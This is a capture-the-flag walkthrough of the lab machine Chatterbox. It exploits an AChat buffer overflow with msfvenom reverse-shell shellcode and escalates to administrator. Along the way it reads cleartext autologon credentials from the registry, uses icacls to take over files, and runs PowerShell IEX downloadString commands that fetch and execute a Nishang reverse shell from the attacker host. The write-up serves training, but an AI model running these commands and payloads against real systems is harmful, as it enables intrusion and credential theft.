---
description: 10.10.10.74
---

# Chatterbox

![](<../../.gitbook/assets/1 (4).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - CVE 2015-1578 // CVE-2015-1577 Achat 0.150 beta7 - Remote Buffer Overflow
* Root - User alfred has access to the "Users" directories. Use icacls to change permissions on root.txt to grab the flag. To get full admin access, find alfred's password in autologon in registry. Create credential object in powershell and execute new reverse shell as administrator.

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ sudo nmap -p- 10.10.10.74 --open                   
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-14 04:18 EST
Stats: 0:05:17 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 55.64% done; ETC: 04:28 (0:04:08 remaining)
Nmap scan report for 10.10.10.74
Host is up (0.016s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
9255/tcp open  mon
9256/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 370.73 seconds

```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV -sC -A -p 9255,9256 10.10.10.74
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-14 04:38 EST
Nmap scan report for 10.10.10.74
Host is up (0.016s latency).

PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp open  achat   AChat chat system
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 9256/tcp)
HOP RTT      ADDRESS
1   15.87 ms 10.10.14.1
2   18.24 ms 10.10.10.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.40 seconds

```

Nmap reveals that there are only two ports listening, and that they both relate to a service called "Achat".

## Searchsploit

Let's check the exploit database with searchsploit to see if we get any hits:

```
└─$ searchsploit achat                     
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                     | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                        | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities           | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                             | php/webapps/24647.txt
------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

There are only two exploits, which appear to be for the same vulnerability. Let's copy the python script and review it.

{% embed url="https://www.exploit-db.com/exploits/36025" %}

> searchsploit -m windows/remote/36025.py

## Structured Exception Handler Buffer Overflow

The code exploits a Structured Exception Handler (SEH) based stack buffer overflow. To learn more about this type of buffer overflow, check out the following page:

{% embed url="https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow" %}

## Gaining Access

In order to use this exploit, we'll need to make some changes. First, we need to generate the shellcode. We can use msfvenom to do this as follows:

> msfvenom -a x86 --platform Windows -p windows/shell\_reverse\_tcp LHOST=10.10.14.7 LPORT=9999 -e x86/unicode\_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

Note that the above command contains a long string of bad characters. If any of these characters are used in our shellcode it would break the code execution and probably crash the application on the target.

After generating our shellcode, msfvenom tells us that the payload size is 774 bytes. Could this be a problem, since the original payload size was 512 bytes?

In this case it is not an issue, since the exploit has been constructed in such a way as to automatically calculate the number of padding characters to add in after our payload as shown in the line of code below:

> p += buf + "A" \* (1152 - len(buf))

As long as our payload is less than 1152 bytes, we are good.

The only other change we need to make is to update the IP address of the target system as shown below:

> server\_address = ('10.10.10.74', 9256)

Let's start a netcat listener, and run the exploit against the target system:

```
└─$ python exploit_36025.py
---->{P00F}!
                  
```

In our listener, we get a shell as the user "alfred", and we can grab the user flag.

```
└─$ nc -nvlp 9999   
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.10.74.
Ncat: Connection from 10.10.10.74:49157.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred

C:\Windows\system32>cd c:\Users\Alfred\Desktop
cd c:\Users\Alfred\Desktop

c:\Users\Alfred\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9034-6528

 Directory of c:\Users\Alfred\Desktop

12/10/2017  06:50 PM    <DIR>          .
12/10/2017  06:50 PM    <DIR>          ..
01/14/2022  08:14 AM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)  19,490,947,072 bytes free

c:\Users\Alfred\Desktop>type user.txt
type user.txt
8def32a1819f04636aa6eca347cbbc29

c:\Users\Alfred\Desktop>

```

## Enumeration as "alfred"

Let's gather some basic system information:

```
c:\Users\Alfred\Desktop>systeminfo
systeminfo

Host Name:                 CHATTERBOX
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00371-222-9819843-86663
Original Install Date:     12/10/2017, 9:18:19 AM
System Boot Time:          1/14/2022, 8:14:08 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,510 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,405 MB
Virtual Memory: In Use:    690 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\CHATTERBOX
Hotfix(s):                 183 Hotfix(s) Installed.
                           [01]: KB2849697
                           [02]: KB2849696
                           [03]: KB2841134
                           [04]: KB2670838
                           [05]: KB2830477
                           [06]: KB2592687
                           [07]: KB2479943
                           [08]: KB2491683
                           [09]: KB2506212
                           [10]: KB2506928
                           [11]: KB2509553
                           [12]: KB2533552
                           [13]: KB2534111
                           [14]: KB2545698
                           [15]: KB2547666
                           [16]: KB2552343
                           [17]: KB2560656
                           [18]: KB2563227
                           [19]: KB2564958
                           [20]: KB2574819
                           [21]: KB2579686
                           [22]: KB2604115
                           [23]: KB2620704
                           [24]: KB2621440
                           [25]: KB2631813
                           [26]: KB2639308
                           [27]: KB2640148
                           [28]: KB2647753
                           [29]: KB2654428
                           [30]: KB2660075
                           [31]: KB2667402
                           [32]: KB2676562
                           [33]: KB2685811
                           [34]: KB2685813
                           [35]: KB2690533
                           [36]: KB2698365
                           [37]: KB2705219
                           [38]: KB2719857
                           [39]: KB2726535
                           [40]: KB2727528
                           [41]: KB2729094
                           [42]: KB2732059
                           [43]: KB2732487
                           [44]: KB2736422
                           [45]: KB2742599
                           [46]: KB2750841
                           [47]: KB2761217
                           [48]: KB2763523
                           [49]: KB2770660
                           [50]: KB2773072
                           [51]: KB2786081
                           [52]: KB2799926
                           [53]: KB2800095
                           [54]: KB2807986
                           [55]: KB2808679
                           [56]: KB2813430
                           [57]: KB2820331
                           [58]: KB2834140
                           [59]: KB2840631
                           [60]: KB2843630
                           [61]: KB2847927
                           [62]: KB2852386
                           [63]: KB2853952
                           [64]: KB2857650
                           [65]: KB2861698
                           [66]: KB2862152
                           [67]: KB2862330
                           [68]: KB2862335
                           [69]: KB2864202
                           [70]: KB2868038
                           [71]: KB2871997
                           [72]: KB2884256
                           [73]: KB2891804
                           [74]: KB2892074
                           [75]: KB2893294
                           [76]: KB2893519
                           [77]: KB2894844
                           [78]: KB2900986
                           [79]: KB2908783
                           [80]: KB2911501
                           [81]: KB2912390
                           [82]: KB2918077
                           [83]: KB2919469
                           [84]: KB2923545
                           [85]: KB2931356
                           [86]: KB2937610
                           [87]: KB2943357
                           [88]: KB2952664
                           [89]: KB2966583
                           [90]: KB2968294
                           [91]: KB2970228
                           [92]: KB2972100
                           [93]: KB2973112
                           [94]: KB2973201
                           [95]: KB2973351
                           [96]: KB2977292
                           [97]: KB2978742
                           [98]: KB2984972
                           [99]: KB2985461
                           [100]: KB2991963
                           [101]: KB2992611
                           [102]: KB3003743
                           [103]: KB3004361
                           [104]: KB3004375
                           [105]: KB3006121
                           [106]: KB3006137
                           [107]: KB3010788
                           [108]: KB3011780
                           [109]: KB3013531
                           [110]: KB3020370
                           [111]: KB3020388
                           [112]: KB3021674
                           [113]: KB3021917
                           [114]: KB3022777
                           [115]: KB3023215
                           [116]: KB3030377
                           [117]: KB3035126
                           [118]: KB3037574
                           [119]: KB3042058
                           [120]: KB3045685
                           [121]: KB3046017
                           [122]: KB3046269
                           [123]: KB3054476
                           [124]: KB3055642
                           [125]: KB3059317
                           [126]: KB3060716
                           [127]: KB3061518
                           [128]: KB3067903
                           [129]: KB3068708
                           [130]: KB3071756
                           [131]: KB3072305
                           [132]: KB3074543
                           [133]: KB3075226
                           [134]: KB3078601
                           [135]: KB3078667
                           [136]: KB3080149
                           [137]: KB3084135
                           [138]: KB3086255
                           [139]: KB3092627
                           [140]: KB3093513
                           [141]: KB3097989
                           [142]: KB3101722
                           [143]: KB3102429
                           [144]: KB3107998
                           [145]: KB3108371
                           [146]: KB3108381
                           [147]: KB3108664
                           [148]: KB3109103
                           [149]: KB3109560
                           [150]: KB3110329
                           [151]: KB3118401
                           [152]: KB3122648
                           [153]: KB3123479
                           [154]: KB3126587
                           [155]: KB3127220
                           [156]: KB3133977
                           [157]: KB3137061
                           [158]: KB3138378
                           [159]: KB3138612
                           [160]: KB3138910
                           [161]: KB3139398
                           [162]: KB3139914
                           [163]: KB3140245
                           [164]: KB3147071
                           [165]: KB3150220
                           [166]: KB3150513
                           [167]: KB3156016
                           [168]: KB3156019
                           [169]: KB3159398
                           [170]: KB3161102
                           [171]: KB3161949
                           [172]: KB3161958
                           [173]: KB3172605
                           [174]: KB3177467
                           [175]: KB3179573
                           [176]: KB3184143
                           [177]: KB3185319
                           [178]: KB4014596
                           [179]: KB4019990
                           [180]: KB4040980
                           [181]: KB976902
                           [182]: KB982018
                           [183]: KB4054518
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.74

```



Winpeas

Let's transfer winpeas to the target and run it. To do this, we can use a python3 web server on our attack machine, and "certutil" on the target machine.

First, download the x86 binary and save it to our working directory, and then start the python3 web server:

> sudo python3 -m http.server 80

On the target system we'll use the "certutil" program that is present on most if not all versions of Windows by default. This program has a download function built into it, and so we can download the file as following:

```
c:\Users\Alfred\Desktop>certutil.exe -urlcache -split -f http://10.10.14.7/winPEASx86.exe winPEASx86.exe
certutil.exe -urlcache -split -f http://10.10.14.7/winPEASx86.exe winPEASx86.exe
****  Online  ****
  000000  ...
  17e800
CertUtil: -URLCache command completed successfully.

c:\Users\Alfred\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9034-6528

 Directory of c:\Users\Alfred\Desktop

01/14/2022  10:00 AM    <DIR>          .
01/14/2022  10:00 AM    <DIR>          ..
01/14/2022  08:14 AM                34 user.txt
01/14/2022  09:55 AM         1,566,720 winPEASx86.exe
               2 File(s)      1,566,754 bytes
               2 Dir(s)  19,481,919,488 bytes free

c:\Users\Alfred\Desktop>
```

Winpeas generates a lot of output, and going through it reveals the following interesting discoveries:

* LSA protection is not enabled
* CredentialGuard is not enabled
* No AV was detected
* WDigest is enabled - plaintext password extraction is possible
* AMSI support: False
* c:\users\administrator: Alfred \[AllAccess]
* AutoLogon credentials found: alfred:Welcome1!
* Firewall Enabled: True

## Root Flag without Privilege Escalation

The user "alfred" seems to have "AllAccess" to the "Administrator" user's folders. Let's see if we can read the root flag:

```
c:\Users\Administrator\Desktop>dir /a
dir /a
 Volume in drive C has no label.
 Volume Serial Number is 9034-6528

 Directory of c:\Users\Administrator\Desktop

12/10/2017  06:50 PM    <DIR>          .
12/10/2017  06:50 PM    <DIR>          ..
12/10/2017  06:08 PM               282 desktop.ini
01/14/2022  08:14 AM                34 root.txt
               2 File(s)            316 bytes
               2 Dir(s)  19,490,947,072 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
Access is denied.

c:\Users\Administrator\Desktop>
```

Let's check the permissions on the file:

```
C:\Users\Administrator\Desktop>icacls root.txt
icacls root.txt
root.txt CHATTERBOX\Administrator:(F)

Successfully processed 1 files; Failed processing 0 files

C:\Users\Administrator\Desktop>
```

This is odd, because winpeas reported that "alfred" has "AllAccess" to the home folders for the "administrator" user. If that is the case, we should be able to simply change the permissions on the file. Let's try it:

```
C:\Users\Administrator\Desktop>icacls root.txt /grant alfred:F
icacls root.txt /grant alfred:F
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files

C:\Users\Administrator\Desktop>
```

That worked, and we can now grab the root flag:

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
cd6d33f51cf819eed72db0da8a428943

C:\Users\Administrator\Desktop>
```

## Privilege Escalation

Let's redo all the steps beginning with "Gaining Access". This time, we'll attempt to get a reverse shell using Powershell. To do this, we'll need to generate new shellcode as follows:

> msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/Invoke-PowerShellTcp.ps1')"" -e x86/unicode\_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

Download the powershell script from the following page:

{% embed url="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" %}

In order to execute the script, we need to call the function from within it. Modify the script by adding the following line at the end:

> Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 9898

Next, we need to start two listeners, one on port 80 (using python3) and one on port 9898 (using netcat).

Once the listeners are running, we can execute the exploit script, which will download the powershell script, and execute it. We should then receive a connection to our netcat listener.

```
└─$ python exploit2_36025.py
---->{P00F}!
              
```

```
└─$ sudo python3 -m http.server 80                                                   
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.74 - - [14/Jan/2022 12:22:35] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

```

```
└─$ nc -nvlp 9898                                                                                          130 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9898
Ncat: Listening on 0.0.0.0:9898
Ncat: Connection from 10.10.10.74.
Ncat: Connection from 10.10.10.74:49158.
Windows PowerShell running as user Alfred on CHATTERBOX
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
chatterbox\alfred
PS C:\Windows\system32> 
```

### Autologon

If the system is using an older versioon of "autologon", the username and password will be stored in the registry in clear text in the following hive:

> HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon

Let's check this hive as follows:

```
PS C:\Windows\system32> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x80000033
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
PS C:\Windows\system32> 
```

As we can see, there are indeed clear text credentials stored in the registry. We now have a set of valid credentials for the target system.

### Password Reuse

As an attacker, one of the first things we should do is to test whether there has been any reuse of any passwords we find. Unfortunately for us, the target system has the firewall enabled and is only allowing two ports to connect to the system, which limits our options.

In Powershell, we can store credentials in a "PSCredential" object and use it when executing commands. Using this method, let's create a credentials object for the "administrator" user and use that to try and get a new reverse shell. We can build our new objet as follows:

> $username = 'administrator'&#x20;
>
> $password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force&#x20;
>
> $credentialsObject = New-Object System.Management.Automation.PSCredential($username, $password)

We need to start a python3 web service in the directory containing our "Invoke-PowerShellTcp.ps1" script. We also need another netcat listener. We'll use the following powershell command to download and execute the script as the "administrator" user which should result in a new powershell session.

> We can use the same port we did for the initial connection (TCP 9898) for our new netcat listener as our system is no longer listening on the port even though we have an established connection.

With our python3 web service running and our netcat listener started, we can run the following command on the target system:

> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.7/Invoke-PowerShellTcp.ps1')" -Credential $credentialsObject

```
└─$ nc -nvlp 9898
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9898
Ncat: Listening on 0.0.0.0:9898
Ncat: Connection from 10.10.10.74.
Ncat: Connection from 10.10.10.74:49163.
Windows PowerShell running as user Administrator on CHATTERBOX
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
chatterbox\administrator
PS C:\Windows\system32> hostname
Chatterbox
PS C:\Windows\system32> 
```

We now have full adminsitrative access to the target system.

## Resources

{% embed url="https://github.com/Avidanborisov/AChat" %}

{% embed url="https://www.exploit-db.com/exploits/36056" %}

{% embed url="https://github.com/EDB4YLI55/achat_reverse_tcp_exploit" %}

{% embed url="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls" %}

{% embed url="https://github.com/samratashok/nishang" %}

{% embed url="https://pscustomobject.github.io/powershell/howto/PowerShell-Create-Credential-Object" %}
